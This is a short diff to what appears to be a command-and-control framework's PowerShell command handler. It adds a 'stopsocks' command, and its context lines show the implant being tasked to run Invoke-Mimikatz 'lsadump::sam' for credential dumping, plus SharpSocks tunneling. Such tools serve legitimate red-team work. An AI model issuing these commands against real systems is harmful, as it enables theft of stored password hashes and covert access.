@@ -437,6 +437,9 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
         new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)
 
+    elif command == "stopsocks":
+        update_label("", randomuri)
+
     elif command == "sharpsocks":
         check_module_loaded("SharpSocks.ps1", randomuri, user)
         import string
